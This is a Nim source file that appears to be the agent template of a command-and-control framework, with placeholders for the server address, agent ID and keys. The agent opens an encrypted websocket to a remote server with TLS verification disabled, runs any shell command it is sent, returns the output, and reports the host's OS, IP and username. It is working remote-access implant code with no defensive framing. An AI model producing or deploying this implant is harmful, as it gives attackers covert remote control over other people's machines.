import os
import net
import osproc
import std/json
import strutils
import strformat
import chronos
import libsodium/sodium
import libsodium/sodium_sizes
import websock/[websock, extensions/compression/deflate]

proc virtualCd(dir, input: string) =
  let rawPath = input.strip()
  var path =
    if rawPath.startsWith("cd "):
      rawPath[3..^1].strip()
    else:
      rawPath

  if path.isAbsolute():
    setCurrentDir(path)
  else:
    var result = dir & "/" & path
    setCurrentDir(result.normalizedPath().absolutePath())

proc main() {.async.} =
  # ID
  let id = "AGENTID"

  # OS
  let os = $hostOS

  # IP
  let sock = newSocket()
  sock.connect("ADDRESS", Port(PORT))
  let ip = sock.getLocalAddr()[0]
  sock.close()

  # User
  let user = getEnv("USER", getEnv("USERNAME", "unknown"))

  # Directory
  var dir = getCurrentDir()

  # Crypto
  let spk = parseHexStr("SERVERPUBLICKEY")
  let ask = parseHexStr("AGENTSECRETKEY")

  proc encrypt(input: string): string =
    let n = randombytes(24)
    let ct = crypto_box_easy(input, n, spk, ask)
    return toHex(n) & toHex(ct)
  
  proc decrypt(input: string): string =
    let n = parseHexStr(input[0..47])
    let ct = parseHexStr(input[48..^1])
    let pt = crypto_box_open_easy(ct, n, spk, ask)
    return pt

  # Connect
  let ws = await WebSocket.connect("ADDRESS:PORT", path = "/wss", secure = true, flags = {TLSFlags.NoVerifyHost, TLSFlags.NoVerifyServerName})
  try:
    await ws.send(encrypt(id))
  except:
    quit(1)

  while true:
    try:
      var msg = await ws.recvMsg()
      if msg.len <= 0:
        continue
      else:
        var task = parseJson(decrypt(cast[string](msg)))

        # Exit
        if task["code"].getInt() == 0:
          await ws.send(encrypt("Done"))
          await ws.close()
          break

        # Shell
        if task["code"].getInt() == 1:
          if task["data"].getStr().startsWith("cd "):
            virtualCd(dir, task["data"].getStr())
            dir = getCurrentDir()
            await ws.send(encrypt(dir & "\n"))
          else:
            let command = execCmdEx(task["data"].getStr())
            await ws.send(encrypt(command.output))

        # Custom command example - host info
        if task["code"].getInt() == 2:
          let output = "OS: " & os & "\n" & "IP: " & ip & "\n" & "USER: " & user
          await ws.send(encrypt(output))

    except:
      continue

waitFor main()
